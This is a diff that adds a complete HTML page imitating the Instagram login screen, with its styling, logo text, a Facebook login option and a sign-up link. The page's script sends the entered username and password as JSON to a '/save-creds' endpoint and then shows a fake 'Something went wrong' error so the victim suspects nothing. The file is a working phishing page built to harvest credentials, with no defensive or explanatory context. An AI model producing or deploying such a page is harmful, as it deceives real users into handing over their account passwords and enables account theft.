@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Instagram Login</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+    background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+    min-height: 100vh;
+    font-family: -apple-system, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.login-container {
+    background: white;
+    border-radius: 4px;
+    padding: 40px 40px 20px;
+    width: 350px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+}
+
+.logo {
+    width: 175px;
+    height: 50px;
+    background: #fff;
+    margin: 0 auto 30px;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    font-size: 28px;
+    color: #262626;
+}
+
+.input-group {
+    margin-bottom: 10px;
+    position: relative;
+}
+
+input {
+    width: 100%;
+    padding: 12px 16px;
+    border: 1px solid #dbdbdb;
+    border-radius: 4px;
+    background: #fafafa;
+    font-size: 14px;
+    color: #262626;
+}
+
+input:focus {
+    border-color: #0095f6;
+    background: white;
+    outline: none;
+}
+
+.login-btn {
+    width: 100%;
+    background: #0095f6;
+    color: white;
+    border: none;
+    padding: 8px;
+    border-radius: 5px;
+    font-weight: 600;
+    margin-top: 10px;
+    cursor: pointer;
+}
+
+.login-btn:hover:not(:disabled) { background: #0077cc; }
+.login-btn:disabled {
+    background: #b8daff;
+    cursor: not-allowed;
+}
+
+.status {
+    margin-top: 15px;
+    padding: 10px;
+    border-radius: 4px;
+    font-size: 14px;
+    text-align: center;
+    display: none;
+}
+
+.status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+.status.loading { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+    text-align: center;
+    color: #8e8e8e;
+    font-size: 13px;
+}
+
+.divider::before, .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #dbdbdb;
+}
+
+.divider span { padding: 0 20px; }
+
+.fb-login {
+    text-align: center;
+    color: #385185;
+    font-size: 14px;
+    font-weight: 600;
+    margin-top: 20px;
+    cursor: pointer;
+}
+
+.signup-link {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 14px;
+}
+
+.signup-link a {
+    color: #0095f6;
+    text-decoration: none;
+    font-weight: 600;
+}
+</style>
+</head>
+<body>
+<div class="login-container">
+    <div class="logo">Instagram</div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Phone number, user name, or email" required>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="login-btn">Log in</button>
+
+        <div id="status" class="status"></div>
+    </form>
+
+    <div class="divider">
+        <span>OR</span>
+    </div>
+
+    <div class="fb-login">Log in with Facebook</div>
+
+    <div class="signup-link">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+
+<script>
+const form = document.getElementById('loginForm');
+const username = document.getElementById('username');
+const password = document.getElementById('password');
+const status = document.getElementById('status');
+const loginBtn = form.querySelector('.login-btn');
+
+form.onsubmit = async function(e) {
+    e.preventDefault();
+
+    const user = username.value.trim();
+    const pass = password.value;
+
+    if (!user || !pass) {
+        showStatus('Please enter username and password', 'error');
+        return;
+    }
+
+    showStatus('Authenticating with Instagram...', 'loading');
+    loginBtn.disabled = true;
+
+    try {
+        const response = await fetch('/save-creds', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Origin': window.location.origin
+            },
+            body: JSON.stringify({ username: user, password: pass })
+        });
+
+        if (response.ok) {
+            showStatus('Something went wrong. Please try again later.', 'error');
+        } else {
+            showStatus('Server error. Please try again later.', 'error');
+        }
+    } catch (error) {
+        showStatus('Something went wrong. Please try again later.', 'error');
+    }
+
+    loginBtn.disabled = false;
+    setTimeout(() => {
+        status.style.display = 'none';
+    }, 5000);
+};
+
+function showStatus(message, type) {
+    status.textContent = message;
+    status.className = `status ${type}`;
+    status.style.display = 'block';
+}
+</script>
+</body>
+</html>
